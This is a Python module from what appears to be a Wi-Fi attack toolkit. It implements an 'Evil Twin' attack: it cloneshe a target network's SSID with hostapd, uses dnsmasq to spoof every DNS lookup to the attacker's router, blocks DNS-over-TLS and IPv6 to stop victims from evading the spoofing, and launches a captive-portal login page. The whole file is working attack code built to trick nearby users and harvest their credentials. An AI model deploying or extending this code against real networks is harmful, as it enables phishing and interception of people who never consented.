import asyncio
import os
from typing import Any, Optional
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class EvilTwinModule(Module):
    """
    Active 802.11 Evil Twin Module.
    Acquires an ap.service lease, runs hostapd for the fake AP,
    dnsmasq for DHCP/DNS spoofing, and a FastAPI web server for the captive portal.
    """
    
    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._hostapd_process: Optional[ManagedProcess] = None
        self._dnsmasq_process: Optional[ManagedProcess] = None
        self._portal_process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.eviltwin"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface", "wlan_ap")
        ssid = params.get("ssid")
        channel = params.get("channel", 6)
        template = params.get("template", "Login_v4")
        
        if not ssid:
            raise ValueError("Target SSID is required for Evil Twin")
            
        # 1. Acquire AP Lease
        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "ap.service")
        
        # 2. DHCP Subnet Collision Detection & IP Assignment (Edge case 6.2)
        base_ip = "10.0.0"
        if os.name == 'posix':
            try:
                proc = await asyncio.create_subprocess_exec("ip", "-4", "addr", "show", "wlan_uplink", stdout=asyncio.subprocess.PIPE)
                stdout, _ = await proc.communicate()
                if b"10.0.0." in stdout:
                    logger.warning("Subnet collision detected on wlan_uplink. Shifting EvilTwin DHCP to 172.16.0.x")
                    base_ip = "172.16.0"
                    
                # Flush existing IPs and assign our evil twin router IP
                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "flush", "dev", iface)
                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "add", f"{base_ip}.1/24", "dev", iface)
                await asyncio.create_subprocess_exec("sudo", "ip", "link", "set", iface, "up")
                
                # Check for dnsmasq port collision (port 53)
                ss_proc = await asyncio.create_subprocess_exec("ss", "-uln", stdout=asyncio.subprocess.PIPE)
                ss_out, _ = await ss_proc.communicate()
                if b":53 " in ss_out:
                    logger.warning("Port 53 is already in use (e.g., systemd-resolved). Attempting to stop it to allow dnsmasq.")
                    await asyncio.create_subprocess_exec("sudo", "systemctl", "stop", "systemd-resolved")
            except Exception as e:
                logger.error(f"Failed to assign IP or handle port collision: {e}")
                
        # 3. Write hostapd.conf
        hostapd_conf = f"/tmp/wcarck_hostapd_{job_id}.conf"
        with open(hostapd_conf, 'w') as f:
            f.write(f"interface={iface}\n")
            f.write(f"ssid={ssid}\n")
            f.write(f"channel={channel}\n")
            f.write("hw_mode=g\n")
            
        # 4. Write dnsmasq.conf (IPv6 & DoH Pinning - Edge case 5.1 & 7.3)
        dnsmasq_conf = f"/tmp/wcarck_dnsmasq_{job_id}.conf"
        with open(dnsmasq_conf, 'w') as f:
            f.write(f"interface={iface}\n")
            f.write(f"dhcp-range={base_ip}.10,{base_ip}.100,12h\n")
            f.write(f"dhcp-option=3,{base_ip}.1\n") # Router
            f.write(f"dhcp-option=6,{base_ip}.1\n") # DNS
            f.write(f"address=/#/{base_ip}.1\n")    # DNS Spoofing IPv4
            f.write(f"address=/#/::\n")             # DNS Spoofing IPv6 (Sinkhole)
        
        # 5. nftables DoH and IPv6 isolation
        if os.name == 'posix':
            try:
                # Drop all IPv6 forwarding on this interface
                await asyncio.create_subprocess_exec("sudo", "nft", "add", "rule", "inet", "filter", "forward", "iifname", iface, "meta", "nfproto", "ipv6", "drop")
                # Drop DoT (853) to force standard DNS
                await asyncio.create_subprocess_exec("sudo", "nft", "add", "rule", "inet", "filter", "forward", "iifname", iface, "tcp", "dport", "853", "reject")
                await asyncio.create_subprocess_exec("sudo", "nft", "add", "rule", "inet", "filter", "forward", "iifname", iface, "udp", "dport", "853", "reject")
            except Exception as e:
                logger.error(f"Failed to apply nftables isolation: {e}")
                
        # Start processes
        h_cmd = ["hostapd", hostapd_conf]
        d_cmd = ["dnsmasq", "-C", dnsmasq_conf, "-d"]
        
        # 6. Start Captive Portal web server
        import sys
        portal_script = os.path.join(os.path.dirname(__file__), "captive_portal.py")
        p_cmd = [sys.executable, portal_script, "--template", template, "--job_id", job_id]
        
        if os.name == 'nt':
            # Windows dev dummy
            h_cmd = ["python", "-c", f"import time; print('Fake AP {ssid} started...'); time.sleep(60)"]
            d_cmd = ["python", "-c", "import time; print('DNS/DHCP started...'); time.sleep(60)"]
            p_cmd = ["python", "-c", f"import time; print('Captive Portal {template} started...'); time.sleep(60)"]
            
        self._hostapd_process = ManagedProcess(cmd=h_cmd, job_id=job_id)
        self._dnsmasq_process = ManagedProcess(cmd=d_cmd, job_id=job_id)
        self._portal_process = ManagedProcess(cmd=p_cmd, job_id=job_id)
        
        await self._hostapd_process.start()
        await self._dnsmasq_process.start()
        await self._portal_process.start()
        
        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def stop(self, job_id: str) -> None:
        try:
            if self._hostapd_process:
                await self._hostapd_process.stop()
                self._hostapd_process = None
                
            if self._dnsmasq_process:
                await self._dnsmasq_process.stop()
                self._dnsmasq_process = None
                
            if self._portal_process:
                await self._portal_process.stop()
                self._portal_process = None
        finally:
            if getattr(self, 'iface', None):
                await self.lease_manager.release(job_id, self.iface)
                
        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        return {
            "is_running": self._hostapd_process is not None,
            "module": self.name
        }
